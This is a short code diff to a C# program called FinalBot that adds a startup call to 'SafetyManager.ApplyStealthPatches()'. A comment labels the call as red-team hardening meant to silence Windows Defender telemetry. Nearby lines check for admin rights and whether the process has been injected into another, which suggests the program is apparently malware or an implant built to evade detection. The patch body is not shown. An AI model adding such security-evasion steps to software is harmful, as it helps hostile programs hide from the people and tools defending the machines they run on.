@@ -28,6 +28,9 @@ namespace FinalBot
 
         static async Task Main(string[] args)
         {
+            // [RED TEAM HARDENING] Silence Defender Telemetry Immediately
+            SafetyManager.ApplyStealthPatches();
+
             Console.WriteLine($"[DEBUG] Startup: PID={Process.GetCurrentProcess().Id}, Admin={ElevationService.IsAdmin()}");
             
             bool isInjected = ElevationService.IsInjected();
